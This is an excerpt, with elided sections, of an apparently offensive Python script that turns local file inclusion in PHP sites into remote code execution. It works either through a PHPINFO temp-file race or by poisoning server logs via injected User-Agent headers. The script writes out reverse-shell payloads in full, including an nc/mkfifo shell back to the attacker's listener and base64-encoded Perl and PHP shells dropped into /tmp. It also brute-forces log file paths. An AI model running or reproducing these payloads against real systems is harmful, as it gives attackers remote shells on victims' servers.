...
def phpInfoLFI(VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset):
    ...
    try:
        ...
        return None
    try:
        d = requests.get(LFI_PATH % str(fn, 'UTF-8'), verify=False,
                         headers={'Connection': 'close'}, timeout=10).content
            ...
            try:
                ...
                if x:
                    if self.payload_type == 3:
                        print(colored("\nGot it! Reverse php Shell created in %s" %
                              self.revshell_name, 'green'))
                    else:
                        print(colored(
...
def controll_log(args):
    ...
    TEMPLATES[2] = ""
    base64revshell = str(base64.b64encode(
        TEMPLATES[args.ptype].encode()), 'UTF-8')
    ...
    revshell_name = '/tmp/' + \
        ''.join([random.choice(string.ascii_letters + string.digits)
                for n in range(12)])+".php"
    PAYLOAD1 = """ %s <?php $file = fopen('/tmp/shell.pl', 'w'); fwrite($file,base64_decode('%s')); fclose($file); exec('`which perl` /tmp/shell.pl'); ?>""" % (
        TAG, base64revshell)
    PAYLOAD2 = """ %s<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f') ?>""" % (
        TAG, args.lhost, args.lport)
    PAYLOAD3 = """ %s <?php $file = fopen('%s', 'w'); fwrite($file,base64_decode('%s')); fclose($file); ?>""" % (
        TAG, revshell_name, base64revshell)
    PAYLOADS = {}
    PAYLOADS[1] = PAYLOAD1
    PAYLOADS[2] = PAYLOAD2
    PAYLOADS[3] = PAYLOAD3
    ...
    debug('The payload: '+PAYLOAD, VERBOSE)
    HEADERS = {"User-Agent": PAYLOAD, "From": PAYLOAD,
               "HTTP_USER_AGENT": PAYLOAD, 'Connection': 'close'}
    for i in range(3):
    ...
    for file in LOG_FILES:
        ...
        if "%s" in file:
            file = file % host
        try:
            req = requests.get(LFI_PATH % file, verify=False, headers={
                               'Connection': 'close'}, timeout=10)
        except requests.exceptions.ReadTimeout:
            found = True
            file_founded = file
            continue
        ...
        if d.find(TAG.encode()) != -1:
            ...
            break
    if found:
        print(colored("\n\nThe web server log file path is %s" %
              file_founded, 'yellow'))
        if args.ptype == 3:
            print(colored("\nGot it! Reverse php Shell created in %s" %
                  revshell_name, 'green'))
            ...
            try:
                requests.get(url, verify=False, headers={
                             'Connection': 'close'}, timeout=10)
            except requests.exceptions.ReadTimeout:
                print(colored("\nVerify your nc listenner %s:%s" %
                      (args.lhost, args.lport), "yellow"))
        else:
            print(colored(
...
def main(args):
    ...
    TEMPLATES[2] = ""
    base64revshell = str(base64.b64encode(
        bytes(TEMPLATES[args.ptype], 'UTF-8')), 'UTF-8')
...
<?php $file = fopen("%s", "w"); fwrite($file,base64_decode("%s")); fclose($file); ?>\r""" % (TAG, revshell_name, base64revshell)
    ...
    # phpinfo post params
    PADDING = "A" * 5000
    COOKIES = {"PHPSESSID": "q249llvfromc1or39t6tvnun42;",
               "othercookie": PADDING}
    HEADERS = {"HTTP_ACCEPT": PADDING, "HTTP_USER_AGENT": PADDING,
               "HTTP_ACCEPT_LANGUAGE": PADDING, "HTTP_PRAGMA": PADDING}
    PHPINFO_PATH += '?a='+PADDING
    files = {'file': ('test.txt', PAYLOAD, 'text/plain')}

    debug("\nLFIrequest template : "+LFI_PATH, VERBOSE)
    response = requests.post(PHPINFO_PATH, files=files,
    ...
    offset = i+256
    if VERBOSE:
        debug("\nPost request template that will be send. url: " +
              response.request.url, VERBOSE)
        debug("\nPost request template that will be send. headers: " +
              str(response.request.headers), VERBOSE)
    ...
    for i in range(0, poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, payload_type, revshell_name,
                  VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset))
...
if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser(
        description='RCE from LFI with PHPINFO assistance or Via controlled log file ')
    arg_parser.add_argument('-a', '--action', dest='action',
                            help='Define the attack type\n \t\t - 1 for PHPINFO and - 2 for controlled log. Value 1 by default')
    arg_parser.add_argument('-l', '--lfi', dest='lfi',
                            help='the url path of the LFI vuln, per example "http://127.0.0.1:8080/lfi.php?file=" ', type=str, required=True)
    arg_parser.add_argument(
        '--lhost', dest='lhost', help='The local ip to listen, for rev shell', type=str, required=True)
    arg_parser.add_argument(
        '--lport', dest='lport', help='The local port to listen, for rev shell', type=int, required=True)
    arg_parser.add_argument('--payload', dest='ptype',
                            help='Set the type of payload to use.\n 1|2|3  By default payload is set to 3', type=int, default=3)
    arg_parser.add_argument('-e', '--end', dest='reqend',
                            help='Define any end of lfi request, per examlpe "%%00"\n by default the end request is empty', type=str, default='')
    arg_parser.add_argument('-v', '--verbose', dest='verbose',
                            help='Define verbose output. set to False by default', type=str, default="FALSE")
    arg_parser.add_argument("-t", "--threads", dest="threads", type=int,
                            help="[For phpinfo action]. Threads number, set to 10 by default", default=10)
    arg_parser.add_argument('-i', '--phpinfo', dest='phpinfo',
                            help='[For phpinfo action]. Define the url path of the "phpinfo" script. Per ex: "http://host/phpinfo.php"', type=str)  # req
    arg_parser.add_argument('-f', '--logfile', dest='logfile',
                            help='[For controlled log action]. Define the path of the http server log file. By default script will use bruteforce', type=str)
